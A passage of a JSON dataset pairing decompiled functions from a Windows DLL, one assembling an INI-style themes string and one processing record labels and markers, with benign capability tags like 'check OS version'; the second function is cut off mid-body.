        "decompiled_code": "\n// WARNING: Type propagation algorithm not settling\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.180051300(int64_t arg1, ulong arg2)\n\n{\n    ushort *puVar1;\n    code *pcVar2;\n    int64_t iVar3;\n    ulong *arg4;\n    ushort *puVar4;\n    ushort *puVar5;\n    uint *puVar6;\n    int64_t iVar7;\n    ushort *puVar8;\n    ulong uVar9;\n    ushort *puVar10;\n    uint64_t noname_2;\n    uint64_t uVar11;\n    uint64_t arg2_00;\n    uchar extraout_XMM0 [16];\n    uchar extraout_XMM0_00 [16];\n    uchar extraout_XMM0_01 [16];\n    uchar auVar12 [16];\n    uint uVar13;\n    uint uVar14;\n    uint uVar15;\n    uint uVar16;\n    uint uVar17;\n    uint uVar18;\n    uint uVar19;\n    uint uVar20;\n    uchar auStack344 [32];\n    ushort *puStack312;\n    ulong uStack296;\n    ushort *puStack280;\n    uint64_t uStack272;\n    uint uStack264;\n    uint uStack256;\n    uint uStack252;\n    uint uStack248;\n    uint uStack244;\n    uchar auStack240 [16];\n    ulong uStack224;\n    uchar auStack216 [16];\n    uchar auStack200 [16];\n    ushort uStack184;\n    unkbyte6 Stack182;\n    ushort *puStack168;\n    uint64_t uStack160;\n    ushort uStack152;\n    unkbyte6 Stack150;\n    ushort *puStack136;\n    uint64_t uStack128;\n    ushort uStack120;\n    unkbyte6 Stack118;\n    ulong uStack104;\n    uint64_t uStack96;\n    uint64_t uStack88;\n    \n    uStack224 = 0xfffffffffffffffe;\n    uStack88 = *0x180123080 ^ auStack344;\n    noname_2 = 0;\n    uStack264 = 0;\n    if (*(arg1 + 0x30) == '\\0') {\n        fcn.180050010(arg1);\n    }\n    if (*(arg1 + 0xb6) == '\\0') {\n        fcn.1800505f0(arg1);\n    }\n    auStack200 = ZEXT816(7) << 0x40;\n    auStack216 = ZEXT1416(auStack216._2_14_) << 0x10;\n    puStack168 = NULL;\n    uStack160 = 7;\n    uStack184 = 0;\n    uStack104 = CONCAT44(*0x180101904, *0x180101900);\n    uStack96 = CONCAT44(*0x18010190c, *0x180101908);\n    uStack120 = 0;\n    puStack136 = NULL;\n    uStack128 = 7;\n    uStack152 = 0;\n    iVar7 = *(arg1 + 0xd0) - *(arg1 + 200);\n    iVar7 = iVar7 / 0x12 + (iVar7 >> 0x3f);\n    uVar11 = (iVar7 >> 2) - (iVar7 >> 0x3f);\n    if (999 < uVar11) {\n        uVar11 = 999;\n    }\n    arg2_00 = noname_2;\n    if (uVar11 != 0) {\n        do {\n            puStack312 = &uStack152;\n            fcn.18004e000(arg1, arg2_00, noname_2, &uStack120);\n            uVar9 = 0x1800f7fd4;\n            if (arg2_00 == 0) {\n                uVar9 = 0x1800f8024;\n            }\n            arg4 = fcn.18002e7e0(&uStack256, uVar9, &uStack120);\n            puVar8 = arg4[2];\n            if (7 < arg4[3]) {\n                arg4 = *arg4;\n            }\n            if (uStack160 - puStack168 < puVar8) {\n                puStack312 = puVar8;\n                fcn.180013690(&uStack184, puVar8, 0, arg4);\n            }\n            else {\n                puVar5 = puStack168 + puVar8;\n                puVar4 = &uStack184;\n                if (7 < uStack160) {\n                    puVar4 = CONCAT62(Stack182, uStack184);\n                }\n                puVar10 = puVar4 + puStack168;\n                puStack168 = puVar5;\n                fcn.1800ade80(puVar10, arg4, puVar8 * 2);\n                puVar4[puVar5] = 0;\n            }\n            if (7 < auStack240._8_8_) {\n                iVar3 = CONCAT44(uStack252, CONCAT22(uStack256._2_2_, uStack256));\n                iVar7 = iVar3;\n                if ((0xfff < auStack240._8_8_ * 2 + 2) && (iVar7 = *(iVar3 + -8),  0x1f < (iVar3 - iVar7) - 8U))\n                goto code_r0x000180051b74;\n                fcn.18008fb24(iVar7);\n            }\n            puStack280 = NULL;\n            uStack272 = 7;\n            uStack296._0_2_ = 0;\n            uStack264 = 1;\n            fcn.18000d550(&uStack296, puStack136 + 1);\n            puVar5 = puStack136;\n            puVar4 = puStack280;\n            puVar8 = &uStack152;\n            if (7 < uStack128) {\n                puVar8 = CONCAT62(Stack150, uStack152);\n            }\n            if (uStack272 - puStack280 < puStack136) {\n                puStack312 = puStack136;\n                fcn.180013690(&uStack296, puStack136, 0, puVar8);\n            }\n            else {\n                puVar10 = &uStack296;\n                if (7 < uStack272) {\n                    puVar10 = CONCAT62(uStack296._2_6_, uStack296);\n                }\n                puVar1 = puVar10 + puStack280;\n                puStack280 = puStack136 + puStack280;\n                fcn.1800ade80(puVar1, puVar8, puStack136 * 2);\n                puVar10[puVar4 + puVar5] = 0;\n            }\n            if (uStack272 - puStack280 < 2) {\n                puStack312 = 0x2;\n                fcn.180013690(&uStack296, 2, 0, 0x1800f9584);\n            }\n            else {\n                puVar8 = puStack280 + 1;\n                puVar4 = &uStack296;\n                if (7 < uStack272) {\n                    puVar4 = CONCAT62(uStack296._2_6_, uStack296);\n                }\n                puVar6 = puVar4 + puStack280;\n                puStack280 = puVar8;\n                *puVar6 = 0xa000d;\n                puVar4[puVar8] = 0;\n            }\n            puVar4 = puStack280;\n            puVar8 = &uStack296;\n            if (7 < uStack272) {\n                puVar8 = CONCAT62(uStack296._2_6_, uStack296);\n            }\n            if (auStack200._8_8_ - auStack200._0_8_ < puStack280) {\n                puStack312 = puStack280;\n                noname_2 = 0;\n                fcn.180013690(auStack216, puStack280, 0, puVar8);\n            }\n            else {\n                auStack200 = CONCAT88(auStack200._8_8_, puStack280 + auStack200._0_8_);\n                auStack216._0_8_ = auStack216;\n                if (7 < auStack200._8_8_) {\n                }\n                noname_2 = puStack280 * 2;\n                fcn.1800ade80(auStack216._0_8_ + auStack200._0_8_ * 2, puVar8, noname_2);\n                *(auStack216._0_8_ + (puVar4 + auStack200._0_8_) * 2) = 0;\n            }\n            if (7 < uStack272) {\n                iVar3 = CONCAT62(uStack296._2_6_, uStack296);\n                iVar7 = iVar3;\n                if ((0xfff < uStack272 * 2 + 2) && (iVar7 = *(iVar3 + -8),  0x1f < (iVar3 - iVar7) - 8U))\n                goto code_r0x000180051b7a;\n                fcn.18008fb24(iVar7);\n            }\n            arg2_00 = arg2_00 + 1;\n        } while (arg2_00 < uVar11);\n    }\n    puStack280 = CONCAT44(*0x180101904, *0x180101900);\n    uStack272 = CONCAT44(*0x18010190c, *0x180101908);\n    uStack296._0_2_ = 0;\n    uStack264 = 2;\n    fcn.18000d550(&uStack296, puStack168 + 0xf);\n    if (uStack272 - puStack280 < 0xf) {\n        puStack312 = 0xf;\n        fcn.180013690(&uStack296, 0xf, 0, L\"[Base]\\r\\nThemes=\");\n    }\n    else {\n        puVar8 = puStack280 + 0xf;\n        puVar4 = &uStack296;\n        if (7 < uStack272) {\n            puVar4 = CONCAT62(uStack296._2_6_, uStack296);\n        }\n        puVar5 = puVar4 + puStack280;\n        puStack280 = puVar8;\n        fcn.1800ade80(puVar5, L\"[Base]\\r\\nThemes=\", 0x1e);\n        puVar4[puVar8] = 0;\n    }\n    puVar5 = puStack168;\n    puVar4 = puStack280;\n    puVar8 = &uStack184;\n    if (7 < uStack160) {\n        puVar8 = CONCAT62(Stack182, uStack184);\n    }\n    if (uStack272 - puStack280 < puStack168) {\n        puStack312 = puStack168;\n        fcn.180013690(&uStack296, puStack168, 0, puVar8);\n        auVar12 = extraout_XMM0_00;\n    }\n    else {\n        puVar10 = &uStack296;\n        if (7 < uStack272) {\n            puVar10 = CONCAT62(uStack296._2_6_, uStack296);\n        }\n        puVar1 = puVar10 + puStack280;\n        puStack280 = puStack280 + puStack168;\n        fcn.1800ade80(puVar1, puVar8, puStack168 * 2);\n        puVar10[puVar5 + puVar4] = 0;\n        auVar12 = extraout_XMM0;\n    }\n    puVar8 = puStack280;\n    if (uStack272 - puStack280 < 4) {\n        puStack312 = 0x4;\n        puVar6 = fcn.180013690(&uStack296, 4, 0, L\"\\r\\n\\r\\n\");\n        auVar12 = extraout_XMM0_01;\n    }\n    else {\n        puVar4 = puStack280 + 2;\n        puStack280 = puVar4;\n        puVar5 = &uStack296;\n        if (7 < uStack272) {\n            puVar5 = CONCAT62(uStack296._2_6_, uStack296);\n        }\n        *(puVar5 + puVar8) = 0xa000d000a000d;\n        puVar5[puVar4] = 0;\n        puVar6 = &uStack296;\n    }\n    auStack240 = auVar12 & 0x0;\n    uStack256._0_2_ = *puVar6;\n    uStack256._2_2_ = *puVar6 >> 0x10;\n    uStack252 = puVar6[1];\n    uStack248 = puVar6[2];\n    uStack244 = puVar6[3];\n    auStack240 = *(puVar6 + 4);\n    *(puVar6 + 4) = 0;\n    *(puVar6 + 6) = 7;\n    *puVar6 = 0;\n    uStack264 = 6;\n    auStack216._0_8_ = auStack216;\n    if (7 < auStack200._8_8_) {\n    }\n    if (auStack240._8_8_ - auStack240._0_8_ < auStack200._0_8_) {\n        puStack312 = auStack200._0_8_;\n        puVar8 = &uStack256;\n        puVar6 = fcn.180013690(puVar8, auStack200._0_8_, 0, auStack216._0_8_);\n    }\n    else {\n        auStack240 = CONCAT88(auStack240._8_8_, auStack200._0_8_ + auStack240._0_8_);\n        puVar4 = &uStack256;\n        if (7 < auStack240._8_8_) {\n            puVar4 = CONCAT44(uStack252, CONCAT22(uStack256._2_2_, uStack256));\n        }\n        puVar8 = puVar4 + auStack240._0_8_;\n        fcn.1800ade80(puVar8, auStack216._0_8_, auStack200._0_8_ * 2);\n        puVar4[auStack240._0_8_ + auStack200._0_8_] = 0;\n        puVar6 = &uStack256;\n    }\n    uVar13 = *puVar6;\n    uVar14 = puVar6[1];\n    uVar15 = puVar6[2];\n    uVar16 = puVar6[3];\n    uVar17 = puVar6[4];\n    uVar18 = puVar6[5];\n    uVar19 = puVar6[6];\n    uVar20 = puVar6[7];\n    *(puVar6 + 4) = 0;\n    *(puVar6 + 6) = 7;\n    *puVar6 = 0;\n    if (auStack200._8_8_ < 8) {\ncode_r0x00018005190a:\n        auStack216 = CONCAT412(uVar16, CONCAT48(uVar15, CONCAT44(uVar14, uVar13)));\n        auStack200 = CONCAT412(uVar20, CONCAT48(uVar19, CONCAT44(uVar18, uVar17)));\n        if (7 < auStack240._8_8_) {\n            puVar4 = CONCAT44(uStack252, CONCAT22(uStack256._2_2_, uStack256));\n            puVar8 = puVar4;\n            if ((auStack240._8_8_ * 2 + 2 < 0x1000) ||\n               (puVar8 = *(puVar4 + 0xfffffffffffffffc),  puVar4 + (-8 - puVar8) < 0x20)) {\n                fcn.18008fb24(puVar8);\n                goto code_r0x000180051954;\n            }\n            goto code_r0x000180051b86;\n        }\ncode_r0x000180051954:\n        auStack240 = CONCAT88(CONCAT44(*0x18010190c, *0x180101908), CONCAT44(*0x180101904, *0x180101900));\n        uStack256._0_2_ = 0;\n        if (7 < uStack272) {\n            puVar4 = CONCAT62(uStack296._2_6_, uStack296);\n            puVar8 = puVar4;\n            if ((uStack272 * 2 + 2 < 0x1000) ||\n               (puVar8 = *(puVar4 + 0xfffffffffffffffc),  puVar4 + (-8 - puVar8) < 0x20)) {\n                fcn.18008fb24(puVar8);\n                goto code_r0x0001800519aa;\n            }\n            goto code_r0x000180051b8c;\n        }\ncode_r0x0001800519aa:\n        uVar9 = fcn.180004ab0(puVar8, &uStack256, 1);\n        fcn.18000b420(puVar8, uVar9);\n        uVar9 = fcn.180004ab0(puVar8, &uStack256, 1);\n        fcn.18000b170(puVar8, auStack216, uVar9);\n        *(arg1 + 0xb5) = 1;\n        fcn.18004cd30(arg1);\n        fcn.180055230(0x180124790);\n        fcn.1800557f0(0x180124790);\n        if (7 < uStack128) {\n            iVar3 = CONCAT62(Stack150, uStack152);\n            iVar7 = iVar3;\n            if ((uStack128 * 2 + 2 < 0x1000) || (iVar7 = *(iVar3 + -8),  (iVar3 - iVar7) - 8U < 0x20)) {\n                fcn.18008fb24(iVar7);\n                goto code_r0x000180051a47;\n            }\n            goto code_r0x000180051b92;\n        }\ncode_r0x000180051a47:\n        puStack136 = NULL;\n        uStack128 = 7;\n        uStack152 = 0;\n        if (uStack96 < 8) {\ncode_r0x000180051a98:\n            uStack104 = CONCAT44(*0x180101904, *0x180101900);\n            uStack96 = CONCAT44(*0x18010190c, *0x180101908);\n            uStack120 = 0;\n            if (7 < uStack160) {\n                iVar3 = CONCAT62(Stack182, uStack184);\n                iVar7 = iVar3;\n                if ((0xfff < uStack160 * 2 + 2) && (iVar7 = *(iVar3 + -8),  0x1f < (iVar3 - iVar7) - 8U))\n                goto code_r0x000180051b9e;\n                fcn.18008fb24(iVar7);\n            }\n            puStack168 = NULL;\n            uStack160 = 7;\n            uStack184 = 0;\n            if (auStack200._8_8_ < 8) goto code_r0x000180051b37;\n            iVar7 = auStack216._0_8_;\n            if (0xfff < auStack200._8_8_ * 2 + 2) {\n                iVar7 = *(auStack216._0_8_ + -8);\n                if (0x1f < (auStack216._0_8_ - iVar7) - 8U) {\n                    fcn.1800b3528(iVar7, auStack200._8_8_ * 2 + 0x29);\ncode_r0x000180051b74:\n                    fcn.1800b3528();\ncode_r0x000180051b7a:\n                    fcn.1800b3528();\n                    goto code_r0x000180051b80;\n                }\n            }\n            fcn.18008fb24(iVar7);\ncode_r0x000180051b37:\n            fcn.18008fb00(uStack88 ^ auStack344);\n            return;\n        }\n        iVar3 = CONCAT62(Stack118, uStack120);\n        iVar7 = iVar3;\n        if ((uStack96 * 2 + 2 < 0x1000) || (iVar7 = *(iVar3 + -8),  (iVar3 - iVar7) - 8U < 0x20)) {\n            fcn.18008fb24(iVar7);\n            goto code_r0x000180051a98;\n        }\n    }\n    else {\n        puVar8 = auStack216._0_8_;\n        if ((auStack200._8_8_ * 2 + 2 < 0x1000) ||\n           (puVar8 = *(auStack216._0_8_ + 0xfffffffffffffffc),  auStack216._0_8_ + (-8 - puVar8) < 0x20)) {\n            fcn.18008fb24(puVar8);\n            goto code_r0x00018005190a;\n        }\ncode_r0x000180051b80:\n        fcn.1800b3528();\ncode_r0x000180051b86:\n        fcn.1800b3528();\ncode_r0x000180051b8c:\n        fcn.1800b3528();\ncode_r0x000180051b92:\n        fcn.1800b3528();\n    }\n    fcn.1800b3528();\ncode_r0x000180051b9e:\n    fcn.1800b3528();\n    pcVar2 = swi(3);\n    (*pcVar2)();\n    return;\n}\n",
        "token_count": 4783
    },
    "1800590f": {
        "rules": [
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_8h\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_18h\n// WARNING: Type propagation algorithm not settling\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.1800590f0(int64_t *arg1, ulong noname_1, ulong noname_2, ulong noname_3, ulong noname_4, ulong arg_38h, \n                  ulong arg_40h, ulong arg_48h, ulong noname_8, ulong arg_58h, ulong arg_60h, ulong arg_68h, \n                  ulong noname_12, ulong arg_78h, ulong arg_80h, ulong arg_88h, ulong noname_16, ulong arg_98h, \n                  ulong arg_a0h, ulong arg_a8h, ulong arg_b0h, ulong arg_b8h, ulong arg_c0h, ulong noname_23, \n                  ulong arg_d0h, ulong arg_d8h, ulong arg_e0h, ulong noname_27, ulong arg_f0h, ulong arg_f8h, \n                  ulong arg_100h, ulong arg_108h, ulong noname_32, ulong arg_118h, ulong arg_120h)\n\n{\n    int64_t *arg1_00;\n    uint64_t *puVar1;\n    int64_t *arg1_01;\n    int16_t iVar2;\n    code *pcVar3;\n    uint uVar4;\n    char cVar5;\n    int32_t iVar6;\n    ulong uVar7;\n    ulong *puVar8;\n    uint *puVar9;\n    uchar *puVar10;\n    uint64_t uVar11;\n    ulong *puVar12;\n    uint64_t *puVar13;\n    int64_t *arg1_02;\n    uint64_t uVar14;\n    uchar *puVar15;\n    int64_t iVar16;\n    ulong *puVar17;\n    ushort *puVar18;\n    int64_t iVar19;\n    int64_t *piVar20;\n    int64_t iVar21;\n    ulong *puVar22;\n    uint64_t arg3;\n    ushort *arg3_00;\n    uint64_t uVar23;\n    int64_t iVar24;\n    ulong *puVar25;\n    uint32_t uVar26;\n    uchar extraout_XMM0 [16];\n    uchar extraout_XMM0_00 [16];\n    uchar extraout_XMM0_01 [16];\n    uchar extraout_XMM0_02 [16];\n    uchar auVar27 [16];\n    uchar auStack600 [32];\n    ulong *puStack568;\n    ulong *puStack560;\n    uint32_t uStack536;\n    ulong uStack528;\n    ulong uStack520;\n    ulong uStack512;\n    ulong uStack504;\n    ulong uStack496;\n    int64_t *piStack488;\n    ulong *puStack480;\n    ulong uStack472;\n    ulong uStack456;\n    uint64_t uStack448;\n    uint32_t uStack440;\n    int32_t iStack436;\n    int64_t iStack432;\n    int32_t iStack424;\n    uchar *puStack416;\n    int64_t iStack408;\n    int64_t *piStack400;\n    ulong uStack392;\n    code *pcStack384;\n    int64_t *piStack376;\n    int64_t *piStack368;\n    ulong uStack360;\n    uchar auStack352 [8];\n    int32_t aiStack344 [2];\n    uchar auStack336 [8];\n    int32_t iStack328;\n    int32_t iStack324;\n    int64_t iStack320;\n    uint64_t uStack312;\n    ulong uStack304;\n    uint64_t uStack288;\n    uint64_t uStack280;\n    ulong uStack272;\n    uint uStack264;\n    uint uStack260;\n    ulong uStack256;\n    uint64_t uStack248;\n    ushort uStack240;\n    ushort uStack238;\n    uint uStack236;\n    uint uStack232;\n    uint uStack228;\n    uint64_t uStack224;\n    uint64_t uStack216;\n    uint32_t uStack208;\n    uint uStack204;\n    uint uStack200;\n    uint uStack196;\n    ulong uStack192;\n    uint64_t uStack184;\n    uchar auStack176 [16];\n    uint32_t *puStack160;\n    uchar uStack152;\n    unkbyte7 Stack151;\n    ulong var_80h;\n    uint uStack128;\n    uint uStack124;\n    int64_t var_bp_70h;\n    ulong var_68h;\n    ulong var_60h;\n    uchar var_bp_58h [8];\n    ulong var_50h;\n    ulong var_48h;\n    ulong var_bp_40h;\n    ulong var_38h;\n    uint64_t var_30h;\n    ulong var_28h;\n    ulong var_18h;\n    ulong var_10h;\n    ulong var_8h;\n    \n    uStack360 = 0xfffffffffffffffe;\n    var_30h = *0x180123080 ^ auStack600;\n    uVar14 = 0;\n    uStack536 = 0;\n    piStack368 = arg1;\n    if ((*(arg1 + 0xc4) == '\\0') || (cVar5 = (**(*arg1 + 0x58))(),  cVar5 != '\\0')) {\n        aiStack344[0] = -1;\n        (**0x1800de7f0)(*0x18012a390, 0x7ec, 0, aiStack344);\n        if (aiStack344[0] < 0) goto code_r0x00018005aabc;\n        iVar24 = *0x18012a398;\n        if (aiStack344[0] != 0) {\n            iVar24 = *0x18012a3a0;\n        }\n        if (iVar24 == 0) goto code_r0x00018005aabc;\n        pcStack384 = (**0x1800de7f0)(iVar24, 0x888, 0, 0);\n        uStack392 = (**0x1800de7f0)(iVar24, 0x889, 0, 0);\n        var_80h._0_4_ = *0x180101910;\n        var_80h._4_4_ = *0x180101914;\n        uStack128 = *0x180101918;\n        uStack124 = *0x18010191c;\n        uStack152 = 0;\n        cVar5 = fcn.1800602c0(arg1, &uStack152);\n        if (cVar5 == '\\0') {\n            fcn.180061430(arg1);\n        }\n        else {\n            piStack376 = arg1 + 0x28;\n            puVar10 = &uStack152;\n            if (0xf < CONCAT44(uStack124, uStack128)) {\n                puVar10 = CONCAT71(Stack151, uStack152);\n            }\n            uVar23 = arg1[0x2a];\n            piVar20 = piStack376;\n            if (0xf < arg1[0x2b]) {\n                piVar20 = *piStack376;\n            }\n            uVar11 = CONCAT44(var_80h._4_4_, var_80h);\n            arg3 = uVar23;\n            if (uVar11 < uVar23) {\n                arg3 = uVar11;\n            }\n            iVar6 = fcn.1800ae4d0(piVar20, puVar10, arg3);\n            if (((iVar6 != 0) || (uVar23 < uVar11)) || (auVar27 = extraout_XMM0,  uVar11 < uVar23)) {\n                fcn.180061430(arg1);\n                auVar27 = extraout_XMM0_00;\n            }\n            piVar20 = arg1 + 0x2c;\n            iVar24 = arg1[0x2d] - *piVar20 >> 0x3f;\n            piStack400 = piVar20;\n            if ((arg1[0x2d] - *piVar20) / 0xe8 + iVar24 == iVar24) {\n                _var_48h = auVar27 & 0x0;\n                var_38h = 0;\n                _var_bp_58h = auVar27 & 0x0;\n                fcn.180010540(&var_50h);\n                fcn.1800131f0(var_bp_58h, L\"(^( )+)|(( )+$)\", 0x1800fcbf6);\n                uStack440 = 0xf0;\n                auStack176 = ZEXT816(0);\n                puStack160 = NULL;\n                _var_bp_70h = ZEXT816(0);\n                var_60h = 0;\n                puStack416 = &uStack272;\n                uStack256 = 0;\n                uStack248 = 0xf;\n                uStack272._0_1_ = 0;\n                fcn.180011120(&uStack272, 0x1800f48f2, 0);\n                uStack192 = CONCAT44(*0x180101914, *0x180101910);\n                uStack184 = CONCAT44(*0x18010191c, *0x180101918);\n                uStack208 = uStack208 & 0xffffff00;\n                fcn.180011120(&uStack208, 0x1800f48f3, 0);\n                uStack288 = CONCAT44(*0x180101914, *0x180101910);\n                uStack280 = CONCAT44(*0x18010191c, *0x180101918);\n                uStack304._0_1_ = 0;\n                puVar10 = &uStack304;\n                fcn.180011120(puVar10, \"RecordTypes\", 0xb);\n                puStack560 = &uStack272;\n                puStack568 = &uStack208;\n                iVar6 = fcn.180009a40(puVar10, &var_bp_70h, &uStack152, &uStack304);\n                uVar23 = iVar6;\n                iStack424 = iVar6;\n                if (0xf < uStack280) {\n                    iVar21 = CONCAT62(uStack304._2_6_, CONCAT11(uStack304._1_1_, uStack304));\n                    iVar24 = iVar21;\n                    if ((0xfff < uStack280 + 1) && (iVar24 = *(iVar21 + -8),  0x1f < (iVar21 - iVar24) - 8U)) {\ncode_r0x00018005aaf2:\n                        fcn.1800b3528();\n                        goto code_r0x00018005aaf8;\n                    }\n                    fcn.18008fb24(iVar24);\n                }\n                uStack288 = CONCAT44(*0x180101914, *0x180101910);\n                uStack280 = CONCAT44(*0x18010191c, *0x180101918);\n                uStack304._0_1_ = 0;\n                if (0xf < uStack184) {\n                    iVar21 = CONCAT44(uStack204, uStack208);\n                    iVar24 = iVar21;\n                    if ((0xfff < uStack184 + 1) && (iVar24 = *(iVar21 + -8),  0x1f < (iVar21 - iVar24) - 8U)) {\ncode_r0x00018005aaf8:\n                        fcn.1800b3528();\ncode_r0x00018005aafe:\n                        fcn.1800b3528();\ncode_r0x00018005ab04:\n                        fcn.1800b3528();\ncode_r0x00018005ab0a:\n                        fcn.1800b3528();\ncode_r0x00018005ab10:\n                        fcn.1800b3528();\ncode_r0x00018005ab16:\n                        fcn.1800b3528();\n                        pcVar3 = swi(3);\n                        (*pcVar3)();\n                        return;\n                    }\n                    fcn.18008fb24(iVar24);\n                }\n                uStack192 = CONCAT44(*0x180101914, *0x180101910);\n                uStack184 = CONCAT44(*0x18010191c, *0x180101918);\n                uStack208 = uStack208 & 0xffffff00;\n                iVar24 = arg1[0x2d];\n                iVar21 = *piVar20;\n                uVar11 = (iVar24 - iVar21) / 0xe8;\n                if (uVar23 < uVar11) {\n                    iVar21 = uVar23 * 0xe8 + iVar21;\n                    piVar20 = piStack400;\n                    for (iVar19 = iVar21; piStack400 = piVar20,  iVar19 != iVar24; iVar19 = iVar19 + 0xe8) {\n                        fcn.180064c70(iVar19);\n                        piVar20 = piStack400;\n                    }\n                    piVar20[1] = iVar21;\n                }\n                else if (uVar11 < uVar23) {\n                    if ((arg1[0x2e] - iVar21) / 0xe8 < uVar23) {\n                        fcn.180064370(piVar20, uVar23);\n                    }\n                    else {\n                        iVar24 = fcn.1800641b0(piVar20, iVar24, uVar23 - uVar11);\n                        arg1[0x2d] = iVar24;\n                    }\n                }\n                iStack436 = 0;\n                if (0 < iVar6) {\n                    puStack416 = NULL;\n                    do {\n                        puVar25 = puStack416 * 0x20 + var_bp_70h;\n                        iVar24 = puStack416 * 0xe8 + *piVar20;\n                        puStack480 = &uStack304;\n                        uStack288 = 0;\n                        uStack280 = 0xf;\n                        uStack304._0_1_ = 0;\n                        fcn.180011120(&uStack304, 0x1800f492e, 0);\n                        iStack320 = 0;\n                        uStack312 = 0xf;\n                        _auStack336 = _auStack336 & 0xffffffffffffff00;\n                        uVar26 = uVar14;\n                        uStack536 = uVar26 | 1;\n                        piStack488 = piStack488 & 0xffffffff00000000 | uVar14 | 1;\n                        if (0xf < puVar25[2] + 6) {\n                            fcn.1800137f0(auStack336, puVar25[2] + 6);\n                        }\n                        iStack320 = 0;\n                        fcn.18000dc30(auStack336, puVar25);\n                        if (uStack312 - iStack320 < 6) {\n                            puStack568 = 0x6;\n                            puVar10 = auStack336;\n                            fcn.180014270(puVar10, 6, 0, \"_Label\");\n                        }\n                        else {\n                            auStack336 = auStack336;\n                            if (0xf < uStack312) {\n                            }\n                            auStack336 = auStack336 + iStack320;\n                            puVar10 = auStack336;\n                            iStack320 = iStack320 + 6;\n                            fcn.1800ade80(auStack336, \"_Label\", 6);\n                            auStack336[6] = 0;\n                        }\n                        puStack560 = &uStack304;\n                        puStack568 = puVar25;\n                        uVar7 = fcn.180004f50(puVar10, &uStack472, &uStack152, auStack336);\n                        fcn.18000d960(iVar24, uVar7);\n                        if (7 < uStack448) {\n                            iVar19 = CONCAT62(uStack472._2_6_, CONCAT11(uStack472._1_1_, uStack472));\n                            iVar21 = iVar19;\n                            if ((0xfff < uStack448 * 2 + 2) && (iVar21 = *(iVar19 + -8),  0x1f < (iVar19 - iVar21) - 8U)\n                               ) goto code_r0x00018005aafe;\n                            fcn.18008fb24(iVar21);\n                        }\n                        uStack456 = 0;\n                        uStack448 = 7;\n                        uStack472._0_1_ = 0;\n                        uStack472._1_1_ = 0;\n                        if (0xf < uStack312) {\n                            iVar21 = auStack336;\n                            if ((0xfff < uStack312 + 1) &&\n                               (iVar21 = *(auStack336 + -8),  0x1f < (auStack336 - iVar21) - 8U))\n                            goto code_r0x00018005ab04;\n                            fcn.18008fb24(iVar21);\n                        }\n                        puStack480 = &uStack472;\n                        uStack456 = 0;\n                        uStack448 = 0xf;\n                        uStack472._0_1_ = 0;\n                        fcn.180011120(&uStack472, 0x1800f492f, 0);\n                        uStack288 = 0;\n                        uStack280 = 0xf;\n                        uStack304._0_1_ = 0;\n                        fcn.180011120(&uStack304, 0x1800f842c, 1);\n                        iStack320 = 0;\n                        uStack312 = 0xf;\n                        _auStack336 = _auStack336 & 0xffffffffffffff00;\n                        uStack536 = uVar26 & 0xfffffffe | 2;\n                        if (0xf < puVar25[2] + 7) {\n                            fcn.1800137f0(auStack336, puVar25[2] + 7);\n                        }\n                        iStack320 = 0;\n                        fcn.18000dc30(auStack336, puVar25);\n                        iVar21 = iStack320;\n                        if (uStack312 - iStack320 < 7) {\n                            puStack568 = 0x7;\n                            puVar10 = auStack336;\n                            fcn.180014270(puVar10, 7, 0, \"_Marker\");\n                        }\n                        else {\n                            auStack336 = auStack336;\n                            if (0xf < uStack312) {\n                            }\n                            puVar10 = auStack336 + iStack320;\n                            iStack320 = iStack320 + 7;\n                            fcn.1800ade80(puVar10, \"_Marker\", 7);\n                            auStack336[iVar21 + 7] = 0;\n                        }\n                        puStack560 = &uStack472;\n                        puStack568 = &uStack304;\n                        uVar7 = fcn.180004b90(puVar10, &uStack528, &uStack152, auStack336);\n                        fcn.18000dd60(iVar24 + 0x20, uVar7);\n                        if (0xf < uStack504) {\n                            uVar14 = uStack528;\n                            if ((0xfff < uStack504 + 1) && (uVar14 = *(uStack528 - 8),  0x1f < (uStack528 - uVar14) - 8)\n                               ) goto code_r0x00018005ab0a;\n                            fcn.18008fb24(uVar14);\n                        }\n                        uStack512 = 0;\n                        uStack504 = 0xf;\n                        uStack528 = uStack528 & 0xffffffffffffff00;\n                        if (0xf < uStack312) {\n                            iVar21 = auStack336;\n                            if ((0xfff < uStack312 + 1) &&\n                               (iVar21 = *(auStack336 + -8),  0x1f < (auStack336 - iVar21) - 8U))\n                            goto code_r0x00018005ab10;\n                            fcn.18008fb24(iVar21);\n                        }\n                        iStack320 = 0;\n                        uStack312 = 0xf;\n                        _auStack336 = _auStack336 & 0xffffffffffffff00;\n                        if (0xf < uStack280) {\n                            iVar19 = CONCAT62(uStack304._2_6_, CONCAT11(uStack304._1_1_, uStack304));\n                            iVar21 = iVar19;\n                            if ((0xfff < uStack280 + 1) && (iVar21 = *(iVar19 + -8),  0x1f < (iVar19 - iVar21) - 8U))\n                            goto code_r0x00018005ab16;\n                            fcn.18008fb24(iVar21);\n                        }\n                        cVar5 = fcn.180067b90(iVar24 + 0x20);\n                        if (cVar5 != '\\0') {\n                            fcn.180011120(iVar24 + 0x20, 0x1800f4972, 0);\n                        }\n                        iStack320 = 0;\n                        uStack312 = 0xf;\n                        _auStack336 = _auStack336 & 0xffffffffffffff00;\n                        uStack536 = uVar26 & 0xfffffffc | 4;\n                        uVar14 = *(iVar24 + 0x30) + 2;\n                        if (0xf < uVar14) {\n                            fcn.1800137f0(auStack336, uVar14);\n                        }\n                        iStack320 = 0;\n                        fcn.18000dc30(auStack336, iVar24 + 0x20);\n                        iVar21 = iStack320;\n                        if (uStack312 - iStack320 < 2) {\n                            puStack568 = 0x2;\n                            fcn.180014270(auStack336, 2, 0, 0x1800f844c);\n                        }\n                        else {\n                            auStack336 = auStack336;\n                            if (0xf < uStack312) {\n                            }\n                            puVar18 = auStack336 + iStack320;\n                            iStack320 = iStack320 + 2;\n                            *puVar18 = 0x2a2e;\n                            auStack336[iVar21 + 2] = 0;\n                        }\n                        uStack528 = 0;\n                        fcn.18002ddc0(&uStack520);\n                        puVar10 = auStack336;\n                        if (0xf < uStack312) {\n                            puVar10 = auStack336;\n                        }\n                        puVar15 = auStack336;\n                        if (0xf < uStack312) {\n                            puVar15 = auStack336;\n                        }\n                        